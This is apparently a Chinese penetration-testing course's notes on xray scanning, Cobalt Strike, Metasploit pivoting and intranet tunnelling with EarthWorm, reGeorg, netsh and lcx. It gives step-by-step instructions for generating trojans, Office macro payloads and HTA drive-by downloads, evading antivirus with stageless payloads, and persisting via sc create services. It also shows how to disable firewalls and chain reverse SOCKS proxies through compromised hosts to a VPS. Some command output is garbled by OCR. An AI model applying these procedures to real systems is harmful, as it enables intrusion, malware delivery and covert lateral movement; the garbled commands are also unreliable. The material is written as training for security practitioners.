#内置rad，主动爬虫扫描模式 –url-file value, –uf value read urls from a local file and scan these urls, one url per line #指定url列表文件 –burp-file value, –bf value read requests from burpsuite exported file as targets #读取burpsuite导出的目标文件 –url value, -u value scan a single url #扫描单个url –data value, -d value data string to be sent through POST (e.g. ‘usernameadmin’) #扫描url时，指定post请求的内容 –raw-request FILE, –rr FILE load http raw request from a FILE #加载一个http请求数据文件 –force-ssl, –fs force usage of SSLHTTPS for raw-request #强制使用https –json-output FILE, –jo FILE output xray results to FILE in json format #输出格式为json –html-output FILE, –ho FILE output xray result to FILE in HTML format #输出格式为html –webhook-output value, –wo value post xray result to url in json format #对接微信钉钉实现发现漏洞自动告警 主要特性有 ## 检测速度快。发包速度快; 漏洞检测算法效率高。 ## 支持范围广。大至 OWASP Top 10 通用漏洞检测，小至各种 CMS 框架 POC，均可以支持。 ## 代码质量高。编写代码的人员素质高, 通过 Code Review、单元测试、集成测试等多层验证来提高代码可靠性。 ## 高级可定制。通过配置文件暴露了引擎的各种参数，通过修改配置文件可以客制化功能。 ## 安全无威胁。xray 定位为一款安全辅助评估工具，而不是攻击工具，内置的所有 payload 和 poc均为无害化检查 目前支持的漏洞检测类型包括: ## XSS漏洞检测 (key: xss) ## SQL 注入检测 (key: sqldet) ## 命令代码注入检测 (key: cmd-injection) ## 目录枚举 (key: dirscan) ## 路径穿越检测 (key: path-traversal) ## XML 实体注入检测 (key: xxe) ## 文件上传检测 (key: upload) ## 弱口令检测 (key: brute-force) ## jsonp 检测 (key: jsonp) ## ssrf 检测 (key: ssrf) ## 基线检查 (key: baseline) ## 任意跳转检测 (key: redirect) ## CRLF 注入 (key: crlf-injection) ## Struts2 系列漏洞检测 (高级版，key: struts) ## Thinkphp系列漏洞检测 (高级版，key: thinkphp) ## POC 框架 (key: phantasm) 来源处理 ## HTTP 被动代理 ## 简易爬虫 ## 单个 URL ## URL列表的文件 ## 单个原始 HTTP 请求文件 结果输出 ## Stdout (屏幕输出, 默认开启) ## JSON 文件输出 ## HTML 报告输出 ## Webhook 输出 使用命令 .\\xray.exe webscan –url http://192.168.18.106/ –html-output 1.html # webscan 扫描web漏洞 # –url 指定url # –html-output 指定输出结果 10-2-3 扫描多个url准备url.txt文件 http://192.168.19.100/pikachu/vul/sqli/sqli_str.php?name=vincesubmit=%E6%9F%A5%E8%AF%A2 http://192.168.19.100/pikachu/vul/urlredirect/urlredirect.php?url=unsafere.php http://192.168.19.100/pikachu/vul/xss/xss_reflected_get.php?message=1submit=submit 扫描命令 .\\xray.exe webscan –url-file .\\url.txt –html-output 2.html 10-2-4 爬虫模式扫描目标网站## 没有登录扫描 .\\xray_windows_amd64.exe webscan –basic-crawler http://192.168.18.111/ –html-output 3.html ## 指定登录后的cookie扫描 修改配置文件config.yaml 正常扫描 .\\xray.exe webscan –basic-crawler http://192.168.18.111/ –html-output 4.html 10-2-4 xray 代理模式进行漏洞扫描## 代理模式扫描http网站 .\\xray_windows_amd64.exe webscan –listen 0.0.0.0:8080 –html-output 5.html ## 代理模式扫描https网站 安装证书 .\\xray_windows_amd64.exe webscan –listen 0.0.0.0:8080 –html-output 6.html 扫描的过程中，浏览器可能会发起其他外链请求 解决办法：修改配置文件 10-2-5 xray与burp联动联动模式1 联动模式2 10-3 旁站检测10-3-1 DonNetScan 10-5 安装waf## 先执行如下指令，注意先停止apache服务，然后再执行 D:\\phpstudy_pro\\Extensions\\Apache2.4.39\\bin httpd.exe -k install -n apache2.4.39 ## 注意，是在apache的bin目录下 ## 然后双击安装安全狗。 10-6 360星图的使用首先得开始系统记录日志功能 httpd-conf 配置文件里 —- CostomLog “loggsaccess.log” common ## 取消#号 打开config.ini文件，修改配置，主要是将你要分析的日志文件所在目录放到这里，再强调一下，路径中不要中文或者空格。 剩下的配置简单看看，保持默认即可。比如我将需要分析的日志文件放到了E:\\wuchao\\tools\\access.log ，然后双击如下文件 还会生成报告，在result文件夹中。并且报告中的信息已经分好类了，基于的owasp top10的方式来分类的。 10-7 cs工具的使用比如将我们的cs文件夹先放到我们的kali2021虚拟机中去 10-7-1 启动服务端：.teamserver 192.168.19.146 test ## ip地址：kali服务器的ip地址 ## test：是待会靶机连接服务器的密码 默认端口为50050，在配置文件中能看到，也可以修改 10-7-2 客户端连接服务器运行：cobalstrike.bat，这个是客户端 如下，启动客户端，输入ip，密码，端口，用户默认 10-7-3 让主机上线创建监听器 生成木马，大家可以看看，它能够生成各种语言的木马，钓鱼攻击、邮件攻击等各种手段，很厉害。 让木马文件上传到目标主机 然后双击这个木马文件运行，注意你的虚拟机的网要是通畅的昂。然后看我们的cs客户端，有主机就上线了 生成无状态可执行的windows木马 这种木马也是可以运行的，但是不会修改目标主机的注册表、启动项(windows设置启动项的地方很多，组策略启动、启动项启动、注册表启动、加载桌面启动等好多种启动方式，这个在将应急响应的时候说过几种)等，没有这些行为动作，那么杀毒软件一般不会杀掉，也是为了免杀，连接上去之后，后面可以以服务的形式将这个木马程序启动起来。 10-7-4 结合metasploit,反弹shell在kali中开启使用命令开启metasploit，结合kali来反弹shell，也是可以的，那为什么要结合msf呢，因为msf的功能也很强大，主机提权、各种攻击载荷、漏洞攻击等。 msfconsole 如下，可以使用xshell来玩 然后在CS中创建监听器 使用Cobalt Strike创建一个windowsforeignreverse_tcp的Listener。其中ip为Metasploit的ip地址，端口为Metasploit所监听的端口。 然后选择增加会话 选择msf那个连接 然后再看msf，就成功了 如果你发现在msf中输入指令没有效果，那么ctrl+c结束一下，然后通过sessions -i找到会话，继续通过 sessions -i id值，就可以了。 也就是说，CS建立的连接会话可以派生到msf中，派生之后有个最大的有点就是，msf可以让这个会话在后台运行，执行 background 指令，继续进行其他的攻击。 10-7-5 office宏payload应用第一步、创建监听器 第二步、生成office宏木马 选择刚才创建的监听器，点击生成 会看到如下提示，告诉具体怎么做，先点击copy，这就是生成的宏木马程序代码，一会在word文档中创建宏之后，将程序复制到里面，比如我现在给它起个名字叫宏木马。 找到目标主机，打开目标主机的某个word文件 Cs 生成的代码直接放到创建里面去，注意：做试验的时候，宏的位置不要设置所有的活动模板和文档，建设应用在当前文档，不然本机所有word文档运行都会种上你的木马，另外打开word文档有宏提示，一般是word默认禁用所有宏（文件—选项—信任中心—信任中心设置里面配置）。创建宏，我们给当前文档创建，这样就不会影响其他的word文档了 如下，将生成的宏木马，替换到弹框的这个位置来。 保存一下，然后关闭这些弹框。 然后双击打开我们加了宏的word文档。 点击确定，然后对宏的安全性进行设置 10-7-6 无状态木马优点：可能过行为查杀、另外administrator运行可直接提升为system权限 第一步：还是创建监听器，生成windows无状态木马，这个昨天给大家提过。 第二步：创建服务 因为我们上面创建的是无状态木马，所以虽然能够上线，但是不能以服务的形式启动，下面就是将木马程序以服务的形式启动的指令，并且这种手工的方式，安全软件是不会拦截你的。 1：添加服务 Sc create test binpath ”c:\\test.exe” start auto displayname ”test” # Sc指令 创建 名为test的服务，指向test.exe程序，启动方式为开机自启动，服务显示名称为test 2. Sc start test #启动test服务 3. Sc delete test #删除服务 4. Sc top test #停止服务 无状态木马主要是为了做免杀，其实在网上有很多在线生成CS免杀的payload工具，好多都是生成C语言的。 因为第一种有状态的木马会有自动的行为动作(修改启动项、注册表之类的)，这些自动的行为可能会被杀毒工具检测到，比如360自带的行为监控功能。 CS还有个功能如下 可以生成各类语言的payload 10-7-6 信息收集一般创建payload的时候，都需要先建立监听。但是创建钓鱼链接是不需要的。信息收集我们手段就是创建钓鱼链接 那么我们的钓鱼连接就生成好了，在这里，点击copy是复制，点击kill是删掉 效果：在内网任意一个主机的浏览器上访问这个ip地址，就会中招。 会看到哪些ip地址访问了你设定那个ip地址和它用的什么系统，如果经过了公网，那么还会记录目标的公网ip。 10-7-7 hta网页挂马HTA是HTML Application的缩写（HTML应用程序），是软件开发的新概念，直接将HTML保存成HTA的格式，就是一个独立的应用软件，与VB、C++等程序语言所设计的软件界面没什么差别。 第一步：创建监听器 第二步：生成hta 如下，官方建议选择powershell，但是powershell只有win7及以上版本的系统才支持，所以一会选择目标主机的时候，我们选一个win7的然后选择我们创建的监听器 弹出如下：保存文件，但是注意，主机上的杀毒工具先关闭了，不然可能会被杀掉。 第三步：使用文件下载 因为我们生成的木马文件，肯定要让别人打开下载，这个文件下载功能就能完成这个事儿， 点击开始，然后弹出如下窗口 网址是： http://192.168.0.6:80/evil.hta 并且点击开始之后，evil.hta文件会自动传到cs服务端的uploads目录中。 第四步：克隆网站 解决办法：如果之前设置过钓鱼页面，记得一定要删掉，不然会克隆的时候会报错,因为两个钓鱼手段是有冲突的。 然后我们先清空一下之前钓鱼的应用信息 然后我们访问 http://192.168.0.6:80 并且我们的木马生成时是开启了键盘记录的，当目标主机在刚才的网页上输入数据时，键盘记录就被记录下来了，换其他页面是不会记录的。 10-7-8 邮件钓鱼10-7-9 beacon控制台的基本使用可以进入到命令行，如下几个指令都可以查看帮助信息 Help # 查看某个指令如何使用 Help shell #比如shell功能不会使用，那么就可以这样查看 ? # 查看能够输入哪些终端指令 10-7-10 Socks代理应用它这个代理功能感觉不是很稳定。我们就根据这个功能做一个实验，重点在于理解过程和该工具的使用方法。 10-1 CS和msf配合做sock代理 kali在win2003上设置一个sock代理，用来访问win7。 那么此时win2003的第二张网卡和win7的网卡ip地址在同一个网段，互相能够ping通，kali和win2003的第一张网卡在同一个网段，互相能够ping通，但是kali不能ping通win7的。 好，我们想让kali能够连通win7，那么就需要设置sock代理了 首先要先通过木马控制住win2003，这个我们已经会玩了，通过windows木马就能搞定，这里我就不演示了，比如拿下的效果如下 第一步：设置代理端口 效果如下 第二步：查看已搭建代理 第三步：利用msf模块直接攻击 方式1： 我们msf的扫描功能，如果能够扫描到10网段的，那么表示成功了 setq Proxies socks4:192.168.0.6:12653 use auxiliaryscannerportscantcp set rhost 10.0.0.3 run 有同学可能会说，执行了cs的代码之后，ping一下不就知道了吗，但是ping不走sock的tcp协议。ping使用的是 ICMP 成功了之后，表示kali能够正常和目标主机连接了，那么就可以使用kali的攻击载荷进行攻击拉取shell了，前面学过的，所以就不演示了。 10-7-11 手工创建socket代理参考网址：https://blog.csdn.net/qq_34801745articledetails111089087 win2003一个网卡（10.0.0.4）和win7的第二张网卡在同一个段，kali和win7的第一个网卡在一个段(192.168.0.6)。那这样的话是win2003属于内网机器不能上网，win7可以上网并且连接着内网的win2003，kali可以上网，能连接win7.我们的目标是通过kali控制不能上网的win2003机器，内网渗透。 这里借助到了netsh指令，通过这个指令能做sock代理，是微软自带的，win7及之后的windows系统版本都支持这个指令，windows2003也支持，但是需要安装配置ipv6才行。 1、windows代理服务器操作 首先新建端口映射，以及查看转发规则建立成功 netsh interface portproxy add v4tov4 listenport监听的端口 connectaddress被攻击者服务器ip connectport被攻击者服务端口 # 监听的端口，自定义 # 被攻击者服务器ip，比如10.0.0.4 # 被攻击者服务端口 netsh interface portproxy show all #查看转发规则 被攻击者端口，比如就是我们这个网站的端口，81端口吧，能访问这个网站表示这个端口是通畅的。 例如 netsh interface portproxy add v4tov4 listenport1111 connectaddress10.0.0.4 connectport81 拿到win7上运行一下，注意要以管理员的身份来执行。 查看转发规则 也就是说当我们访问win7的1111端口的时候，实际上访问的是10.0.0.4的81端口。 2、netsh成功转发 可以看到成功通过端口转发，外网攻击者kali成功通过浏览器访问带了内网的web服务器业务页面。在我们物理机上，也就是和win7的第一张网卡在同一个局域网的主机访问一下win7第一张网卡和1111端口，就看到了win2003的81端口效果 通过这种手工的方式做内网内透是非常不错的选择，并且是免杀的，因为这个netsh指令是微软自带的。 10-7-12 cs提权与内网渗透插件提权工具网址 https://github.com/rsmudge/Elevatekit https://k8gege.org/Download/ https://github.com/k8gege/Aggressor 第一个连接地址的工具和一个ladon工具(扫描工具)我已经给大家下载好了，就在昨天给大家的CS工具中了 然后，打开脚本管理器 CS自带的提权，这个功能不是很好，其他的功能都还可以。 它的几个payload都不太好用 看一下K8ladon第三方插件的相关功能，这是个专门做内网渗透的工具,，加上了这些插件之后，内网渗透就事半功倍了。也是CS牛逼的一点，可以加载各种第三方插件。 目前市面上大家做渗透用的最多的就是CS 我还给大家准备了一些其他插件，网上下载的。 10-7-13 cs4.013-1 创建监听器1、点击 Cobalt Strike - Listeners-Add，其中内置了八个Payload， wndowsbeacon_dnsreverse_dns_txt windowsbeacon_httpreverse_http windowsbeacon_httpsreverse_https windowsbeacon_bind_pipe windowsbeacon_tcp windowsbeacon_extc2 windowsforeignreverse_http windowsforeignreverse_https 2、windowsbeacon为内置监听器，包括dns、http、https、smb、tcp、extc2六种方式的监听器；windowsforeign为外部监听器。 13-2 生成木马点击Attacks-Packages-Windows Executable，点击Generate生成，选择生成的路径及文件名保存即可。 13-3 运行木马将生成的exe文件上传到目标主机运行，自动在客户端上线 10-7-14 CS免杀在线shellcode生成， https://go.xn--9tr.com/ 我们知道cs可以生成各类语言的payload，一般护网中红队用c语言的比较多，生成c语言的木马之后，将payload放到这里，点击生成，他会自动给你生成一个16进制的.exe程序，能够免杀。不信生成完之后，我们可以放到世界杀毒网，有好多这种病毒检测网站，比如用下面这个，我们之前用过这个网站。 些网站中调用的这些杀毒软件，他们都是对现有的病毒或者木马进行逆向功能，提权里面的特征码，加入到自己的检测库里面，如果你给它的程序代码中有它已经存上的特征码，那么就会被检测出来。 10-7-15 sock4和sock5的区别socks是一个协议， ## socks4和socks5都属于socks协议，只是由于所支持的具体应用不同而存在差异。socks4代理只支持TCP应用，而socks5代理则可以支持TCP和UDP两种应用。不过由于socks5代理还支持各种身份验证机制，服务器端域名解析等，而socks4代理没有，所以通常对外开放的socks代理都是socks4代理，因此,UDP应用通常都不能被支持。也就是说，socks4能干的socks5都可以干，反过来就不行了。 10-7-16 内网渗透之信息收集16-1 查看操作系统版本和补丁信息win10 cmd中输入：systeminfo，系统信息和补丁信息都有 linux:centos7 查看系统版本 cat etcredhat-release 查看内核版本 cat procversion uname -r 补丁情况：https://www.csdn.net/tags/NtzaggwsNjc0ODEtYmxvZwO0O0OO0O0O.html 16-2 系统查看用户和用户组win10: net user #查看所有账户 net user 用户名 #查看用户详细信息 net user 用户名 新密码 #给用户改密码（只有管理员可使用） net user 用户名 密码 add（del） # 创建（删除）用户名和密码 net localgroup #列出所有组 net localgroup 组名 add #新建组 net localgroup 组名 #查看该组成员 net localgroup administrator 用户名 add（del） # 把用户添加（把用户从组中删除）到管理员组 net user 用户名 active:yes #激活账户 net user 用户名 active:no #禁用账户 linux：centos7 https://blog.csdn.net/erwange/article/details/104524602 16-3 查看是否安装了杀软的方法方法1：通过指令查看 wmic namespace:\\root\\securitycenter2 path antivirusproduct GET displayName,productState, pathToSignedProductExe 方法2：通过进程对应服务命令查看进程，通过进程来查看是否为杀软。 https://maikefee.com/av_list 在主机上执行 tasklist svc 将结果放到网站中去，该网站会自动将杀软程序识别出来。 MsMpeng.exe实际上微软自家安全软件Microsoft Security Essential和Windows Defender的主要进程. 16-4 查看防火墙状态的指令win10: netsh advfirewall show allprofiles ## 关闭专用网络(R) netsh firewall set opmode modedisable ## 关闭专用网络(R) 和 来宾或公用网络(P) netsh advfirewall set allprofiles state off linux：centos7 启动： systemctl start firewalld 关闭： systemctl stop firewalld 查看状态： systemctl status firewalld 开机禁用 ： systemctl disable firewalld 开机启用 ： systemctl enable firewalld 10-8 ew工具的使用10-8-1 ew有6中模式和常用参数 ew有六种模式，分别是： · ssocksd · rcsocks · rssocks · Icx_slave · Icx_listen · Icx_tran ## ssocksd是用于普通网络环境下的正向连接。 ## rcsocks和rssocks用于反向连接。 ## Icx_slave、Icx_listen和Icx_tran用于复杂网络环境的多级连接。 常用参数 -I:\t## 指定要监听的本地端口 -d:\t## 指定要反弹到的机器ip -e:\t##指定要反弹到的机器端口 -f:\t## 指定要主动连接的机器ip -g:\t## 指定要主动连接的机器端口 -t:\t## 指定超时时长，默认为1000 10-8-2 一级代理 正向代理 ## 当目标机器有一个公网ip时，可以使用以下命令建立一个socks5的代理。 .ew -s ssocksd -11080 rootekali:#.ew -s ssocksd -11680 ssocksd 0.0.0.0:1080 —[10000 usec]– socks server Tcp — Www.baidu.com:80 – -(open) 19 -0–(close)usedunused θ1000 反向代理 ## 如果目标主机没有公网ip,则我们可以使用反向代理。在我们公网VPS(1.1.1.1)上建立一个转接隧道，将VPS 1080端口监听的流量转发到888端口。然后目标机器主动连接我们VPS的888端口。然后我们就可以通过设置代理为VPS的1080端口建立一条通往目标主机内网的socks5隧道了。 VPS:.ew -s rcsocks -11080 -e 888 目标机器：.ew -s rssocks -d 1.1.1.1 -e 888 10-8-3 二级代理二级代理 ## 现在有这么一种情况。服务器A能出网，服务器B不能出网，但是服务器B可以访问服务器C也就是靶标。服务器A不能访问到服务器C靶标，但是能通服务器B。 VPS:1.1.1.1 服务器A(Linux):192.168.10.136 服务器B(Windows):192.168.10.128 靶标web系统：http://192.168.10.132 ## 我们目前拿到了服务器A和服务器B的权限服务器A可以出网，并且可以访问服务器B,但是访问不了把标web系统服务器B不能出网，但是可以访问靶标web系统 ## 首先，在VPS上开启如下监听，将1080端口监听的流量都转发到本地的888端口 .ew -s lcx listen -11080 -e 888 [root@VPs代理及隧道]#.ew -s resocks -11080 -e 888 rcsocks 0.0.0.0:1080 –[10000 usec]-0.0.0.0:888 init cmd_server_for_rc here start listen port here ## 然后在服务器B上执行如下命令，监听本地的999端口 ew.exe -s ssocksd -1999 C:Mllsers\\xieNDesktop)ew.exe -s asockad -1999 ssocksd 8.8.8.8:999-[18888 usec]一socks server ## 最后再服务器A上执行如下命令，将VPS的888端口和服务器B的999端口连接起来 .ew -s Icx_slave -d 1.1.1.1 -e 888 -f 192.168.10.128 -g 999 ## 以上命令都执行完之后，设置socks5代理为VPS的1080端口，即可成功访问靶标web系统， [rootevps代理及隧道]#.ew -s rcsocks -11680 -e 888 10-8-4 三级代理 ## 现在有这么一种情况。服务器A能出网，服务器B不能出网，服务器C也不能出网。服务器A只能访问服务器B。服务器B只能访问服务器A和服务器C.服务器C能访问服务器B,也能访问靶标。 · VPS:1.1.1.1 ·服务器A(Linux):192.168.10.136 ·服务器B(Windows):192.168.10.128 ·服务器C(Linux):192.168.10.129 ·靶标web系统：http://192.168.10.132 ## 我们目前掌列了服务据A、服务器B和吸务器C的权限服务器A可以出网，并目可以访问服务差B,但是污同不了现标web系统服务码B不能出网，但是可以动问服务册C服务器C不能出网，但是可以访问记标 ## 首先，在VPS上执行如下命令，将1080端口监听的流量都转发到本地的888端口 .ew -s rcsocks -11080 -e 888 ## 然后在服务器A上执行如下命令，将VPS的888端口和内网主机B的999端口连接起来 .ew -s lcx_slave -d IP地址 -e888 -f 192.168.10.128 -g 999lcx_slave:IP地址 888 –[18080 usec]– 192.168.10.128:999 ## 接着在服务器B上执行如下命令，将监听的999端口的流量都转发给本地的777端口 ew.exe -s lcx_listen -1999 -e 777 C:Nlsers\\xie\\Desktopew.exe -s lcx_listen -1999 -e 777 resocks 8.0.0.0:999 –[18000 usec]-8.0.8.0:7?? init cnd_server_for_rc here start listen port here ## 以上命令都执行完之后，设置socks5代理为VPS的1080端口，即可成功访问靶标web系统 [rootevPs代理及隧道]#·ew -s resocks -11080 -e 888 rcsocks 0.0,0.0:1080 –[10800 usec]–0.0.0.0:888 init cmd_server_for_re here start listen port hererssocks cmd_socket OK! - -(open)usedunused 1999 –(close)used d100 rootkal1:-# rootgkali:-#.ew -s lcx_slave -de 888 ·f 192.168.18.128 -g 9991cx_slave7:888 –[10000 usec]·→192.168.10.128:999- -(open)usedud 1999-(close)usedunused 81688 ·1Cantos [rootgCentos7～]#.ew -s rssocks -d 192.158.10.128 -e 777rssocks 192.168,10.128:777 –[1608e usec]– socks serverthe recv ip is 192.168.10.132 Tcp.·· 192.168.18.132:80–8-(open)usedunused 1999–(close)usedunused e1000 [rootgvps ~]# proxycheins4 curl http://192.168,10.132 [proxychains] config file found:etcproxychains.conf [proxychains] preloading usr1ib64proxychains-nglibproxychains4.so [proxychains] DLL init: proxychaims-ng 4.11 [proxychains] Dynamie cisin .. 0.0.0.0:1680 192.168.16.132:80 OK hello,word![footgVPS ～]# [rootevps]# hsitlog csdn.nelon_36119192 10-9 内网转发工具的使用常⻅内⽹转发⼯具的分类： 按照协议进⾏分类，可以分为：Socks协议 和Socket协议 按照⼯具⼯作原理分类分为： 端⼝转发类(隧道)和 web代理类 10-9-1 reGeorg结合proxychains代理链(HTTP隧道)reGeory适⽤于公⽹服务器只开放了80端⼝的情况。 reGeorg是⽤ python 写的利⽤Web进⾏代理的⼯具，流量只通过 http 传输，也就是http隧道。 现在有这么⼀个环境，我们获取到了位于公⽹Web服务器的权限，或者我们拥有可以往公⽹Web服务器web⽬录下上传任何⽂件的权限，但是该服务器开启了防⽕墙，只开放了80端⼝。内⽹中存在另外⼀台主机，这⾥假设内⽹存在⼀台Web服务器。然后，我们现在要将公⽹Web服务器设置为代理，通过公⽹服务器的80端⼝，访问和探测内⽹Web服务器的信息。 根据公⽹服务器⽹站是哪种脚本类型上传哪种类型的脚本，这⾥我搭建的是php环境，所以上传php脚本 然后我们在攻击机上执⾏如下语句 python2 reGeorgSocksProxy.py -l 0.0.0.0 -p 1080 -u http://100.100.10.12/tunnel.nosocket.php #表示本地1080端⼝的流量都转发给指定的那个 url ## 然后配置proxychains代理链的配置⽂件etcproxychains.conf ，将代理设置成本机的1080端⼝： socks5 127.0.0.1 1080 ## 然后命令前⾯加上 proxychains即可。如： proxychains curl 192.168.10.19 ## 所以我们流量的⾛向是： 流量-本地1080端⼝-web服务器的80端⼝(通过我们上传的php⽂件进⾏流量转发)-内⽹服务器-web服务器的80端⼝-本地1080端⼝ 如图，可以看到我们已经可以访问内⽹的Web服务器。那么，我们就可以进⼀步渗透了！ 这⾥需要主要，使⽤nmap程序时应该注意的点 #不能使⽤nmap默认的扫描⽅式，不能使⽤-A -T4参数 proxychains nmap -Pn -sT -p 1-10000 -v 192.168.10.19 10-9-2 EW(EarthWorm)结合proxychains代理链EW 是⼀套便携式的⽹络穿透⼯具，具有 SOCKS5服务架设和端⼝转发两⼤核⼼功能，可在复杂⽹络环境下完成⽹络穿透。该⼯具能够以“正向”、“反向”、“多级级联”等⽅式打通⼀条⽹络隧道，直达⽹络深处，⽤蚯蚓独有的⼿段突破⽹络限制，给防⽕墙松⼟。⼯具包中提供了多种可执⾏⽂件，以适⽤不同的操作系统，Linux、Windows、MacOS、Arm-Linux 均被包括其内,强烈推荐使⽤，跨平台，任何平台都 可以轻松使⽤！ 现在有这么⼀个环境，我们获取到了位于公⽹Web服务器的权限，内⽹中存在另外⼀台主机，这⾥假设内⽹存在⼀台Web服务器。然后，我们现在要将公⽹Web服务器设置为代理，访问和探测内⽹Web服务器的信息。 不管是linux还是windows系统，Earthworm的包都是⼀个，如图上⾯。直接进⼊包⾥⾯，选择对应的程序即可执⾏ 2-1 EW正向代理Web服务器的设置 ## 如果是Linux系统 .ew_for_linux64 -s ssocksd -l 1080 #监听本地的1080端⼝ ## 如果是Windows系统 ew_for_Win.exe -s ssocksd -l 1080 #监听本地的1080端⼝ 我们主机的设置 ## 如果是Linux系统，配置proxychains代理链的配置⽂件，将代理设置成 100.100.10.12的1080端⼝： socks5 100.100.10.12 1080 ## 然后命令前⾯加上 proxychains即可。如： proxychains curl 192.168.10.19 ## 如果是Windows系统，直接浏览器中设置代理为 100.100.10.12的1080端⼝，或者利⽤ Proxifier、sockscap64 设置全局代理 2-2 EW反向代理Web服务器的设置 ## 如果是Linux系统： .ew_for_linux64 -s rssocks -d 100.100.10.13 -e 8888 #将本机的流量全部转发到 100.100.10.13的8888端⼝ ## 如果是Windows系统： ew_for_Win.exe -s rssocks -d 100.100.10.13 -e 8888 #将本机的流量全部转发到 100.100.10.13的8888端⼝ 我们主机的设置 ## 如果是Linux系统： .ew_for_linux64 -s rcsocks -l 1080 -e 8888 #将本机的8888端⼝的流量都转发给1080端⼝，这⾥8888端⼝只是⽤于传输流量 ## 然后配置proxychains代理链的配置⽂件，将代理设置成 127.0.0.1的1080端⼝： socks5 127.0.0.1 1080 ## 然后命令前⾯加上 proxychains即可。如： proxychains curl 192.168.10.19 ## 如果是Windows系统 ew_for_Win.exe -s rcsocks -l 1080 -e 8888 #将本机的8888端⼝的流量都转发给1080端⼝，这⾥8888端⼝只是⽤于传输流量 ## 然后浏览器中设置代理为 100.100.10.12的1080端⼝，或者利⽤ Proxifier 、sockscap64 设置全局代理 10-9-3 Ssocks正向代理(Linux)Ssocks是Linux下⼀款socks代理⼯具套装，可⽤来开启socks代理服务，Ssocks⽀持socks5验证，⽀持ipv6和UP，并提供反向socks代理服务。但是由于Ssocks不稳定，所以不建议使⽤。 现在有这么⼀个环境，我们获取到了位于公⽹Web服务器的shell，该web服务器是Linux系统，内⽹中存在另外⼀台主机，这⾥假设内⽹存在⼀台Web服务器。然后，我们现在要将公⽹Web服务器设置为代理，访问和探测内⽹Web服务器的信息。 ⾸先，我们的主机和公⽹的Web服务器都得安装上Ssocks。 安装Ssocks的话，直接安装包安装，软件会被安装在 usrlocalbin⽬录下，所以我们得去该⽬录执⾏命令。 3-1 正向代理Web服务器的操作 .rssocks -vv -s 100.100.10.13:9999 #接收100.100.10.13的9999端⼝的流量 我们主机的操作 ## ⾸先配置proxychains代理链的配置⽂件，把最后的内容改成 socks5 127.0.0.1 8080 .rcsocks -l 1080 -p 9999 -vv #然后将本地的1080端⼝的流量转发到9999端⼝ ## 接下来，我们想要访问和操作操作内⽹主机192.168.10.19的话，只需要在命令前⾯加上 proxychains ⽐如，获得内⽹Web服务器的⽹⻚⽂件： proxychains curl 192.168.10.19 如果这⾥我们的主机是Windows系统的话，Windows系统下也有很多代理⼯具，⽐如 Proxifier、sockscap64 10-9-4 Netsh实现端⼝转发Netsh 是Windows⾃带的命令⾏脚本⼯具，它可以建⽴端⼝映射。 现在有这么⼀个环境，内⽹中有⼀台Web服务器，但是我们处于公⽹，所以⽆法访问该服务器。于是，我们可以在中间Web服务器上利⽤Netsh实现⼀个端⼝映射，只要我们访问中间Web服务器公⽹地址的指定端⼝，就相当于我们访问内⽹Web服务器的80端⼝。 中间Web服务器的配置 netsh interface portproxy add v4tov4 listenaddress100.100.10.11 listenport8080 connectaddress192.168.10.19 connectport80 #新建⼀个端⼝映射，将100.100.10.11的8080端⼝和192.168.10.19的80端⼝做个映射 netsh interface portproxy show all #查看端⼝映射 netsh interface portproxy delete v4tov4 listenaddress100.100.10.11 listenport8080 #删除端⼝映射 那么，我们通过访问Web服务器的公⽹地址的8080端⼝就可以访问内⽹中的Web服务器了。 10-9-5 Netsh实现SSH到内⽹主机(远程端⼝转发)现在我们有这么⼀个环境，我们获得了公⽹服务器的权限，并且通过公⽹服务器进⼀步的内⽹渗透，得到了内⽹主机的权限。拓扑图如下。 于是，我们还可以利⽤windows⾃带的Netsh来进⾏22端⼝的转发。在公⽹windows服务器上的操作 netsh interface portproxy add v4tov4 listenaddress100.100.10.14 listenport2222 connectaddress192.168.10.129 connectport22 #监听 100.100.10.14的2222端⼝，映射到192.168.10.129 的22端⼝上 所以，我们ssh连接到公⽹服务器的2222端⼝即可 10-9-6 Netsh实现3389到内⽹主机(远程端⼝转发)现在我们有这么⼀个环境，我们获得了公⽹服务器的权限，并且通过公⽹服务器进⼀步的内⽹渗透，得到了内⽹主机的权限。拓扑图如下。 于是，我们还可以利⽤Windows⾃带的Netsh来进⾏3389端⼝的映射。在公⽹windows服务器上的操作 netsh interface portproxy add v4tov4 listenaddress100.100.10.14 listenport3340 connectaddress192.168.10.152 connectport3389 于是，我们远程3389连接公⽹服务器100.100.10.14的3340端⼝ 10-9-7 Netsh实现本地端⼝转发现在我们有这么⼀个环境，我们获得了公⽹服务器的权限，并且获得了该服务器的账号密码。该服务器的3389端⼝也开放着，但是只对内开放，所以我们现在就需要做本地端⼝映射，将3389端⼝的流量映射到其他端⼝。 该服务器的操作 netsh interface portproxy add v4tov4 listenaddress192.168.10.15 listenport13389 connectaddress192.168.10.15 connectport3389 只需要远程连接该主机的13389端⼝即可 10-9-8 LCX实现端⼝转发Lcx是基于socket套接字实现的端⼝转发⼯具，有Windows和Linux版本。 现在有这么⼀个环境，内⽹中有⼀台Web服务器，但是我们处于公⽹，所以⽆法访问该服务器。于是，我们可以在中间Web服务器上利⽤LCX进⾏端⼝转发，将公⽹Web服务器的8080端⼝流量转发到内⽹Web主机的80端⼝上，那么我们访问公⽹Web服务器的8080端⼝就相当于访问内⽹Web服务器的80端⼝。 公⽹web服务器的配置 lcx.exe -tran 8080 192.168.10.19 80 #将本地的8080端⼝流量转发到192.168.10.19的80端⼝上 当我们访问公⽹服务器的8080端⼝时，就相当于访问内⽹服务器的80端⼝ 10-9-9 LCX实现本地端⼝转发(Windows的场景)我们现在拿到了⼀台主机的账号、密码和权限，现在想远程RDP连接该主机，该主机的3389端⼝只对内开放，不对外开放。所以，我们可以利⽤lcx进⾏本地端⼝的转发。将3389的流量转到33389端⼝上。 ⽬标机的操作，将3389端⼝的流量转发给33389端⼝ lcx.exe -tran 33389 127.0.0.1 3389 只需要远程连接⽬标主机的33389端⼝即可 10-9-10 LCX实现本地端⼝转发(Linux的场景)我们现在拿到了⼀台主机的账号、密码和权限，现在想远程SSH连接该主机，该主机的22端⼝只对内开放，不对外开放。所以，我们可以利⽤lcx进⾏本地端⼝的转发。将2222的流量转到22端⼝上。 ⽬标机的操作，将2222端⼝的流量都转发到22端⼝上 .lcx -m l -pl 2222 -h2 127.0.0.1 -p2 22 10-9-11 LCX实现SSH到内⽹主机(公⽹服务器是Windows)现在我们有这么⼀个环境，我们获得了公⽹服务器的权限，并且通过公⽹服务器进⼀步的内⽹渗透，得到了内⽹主机的权限。拓扑图如下。 于是，我们还可以利⽤lcx来进⾏22端⼝的转发。 